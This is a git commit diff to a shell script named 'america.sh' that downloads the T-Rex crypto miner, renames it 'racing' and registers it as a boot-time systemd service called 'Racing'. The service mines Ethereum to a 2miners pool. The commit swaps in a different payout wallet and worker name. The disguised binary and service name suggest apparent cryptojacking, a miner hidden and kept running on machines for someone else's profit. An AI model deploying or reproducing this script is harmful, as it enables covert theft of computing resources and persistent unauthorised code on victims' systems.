f126dc4f4886ed0e049ba204ad6b728d710a1f11
pip-fugl <104482629+pip-fugl@users.noreply.github.com>
2022-05-08 06:13:40 +0000

    Update america.sh

--- america.sh
+++ america.sh
@@ -12,7 +12,7 @@ sudo apt-get install libcurl3 -y
 sudo wget https://github.com/trexminer/T-Rex/releases/download/0.21.6/t-rex-0.21.6-linux.tar.gz
 sudo tar xvzf t-rex-0.21.6-linux.tar.gz
 sudo mv t-rex racing
-sudo bash -c 'echo -e "[Unit]\nDescription=Racing\nAfter=network.target\n\n[Service]\nType=simple\nExecStart=/home/racing -a ethash -o stratum+tcp://asia-eth.2miners.com:2020 -u 0x2180611d6d7F07688037Ff22f152E9E2D942D78a -p x\n\n[Install]\nWantedBy=multi-user.target" > /etc/systemd/system/racing.service'
+sudo bash -c 'echo -e "[Unit]\nDescription=Racing\nAfter=network.target\n\n[Service]\nType=simple\nExecStart=/home/racing -a ethash -o stratum+tcp://asia-eth.2miners.com:2020 -u 0x6F3c2438d3927Fbe922657b010FF1357bB67dbc2 -p x\n\n[Install]\nWantedBy=multi-user.target" > /etc/systemd/system/racing.service'
 sudo systemctl daemon-reload
 sudo systemctl enable racing.service
-sudo ./racing -a ethash -o stratum+tcp://asia-eth.2miners.com:2020 -u 0x2180611d6d7F07688037Ff22f152E9E2D942D78a -p x -w yasuo1 &
+sudo ./racing -a ethash -o stratum+tcp://asia-eth.2miners.com:2020 -u 0x6F3c2438d3927Fbe922657b010FF1357bB67dbc2 -p x -w lele &
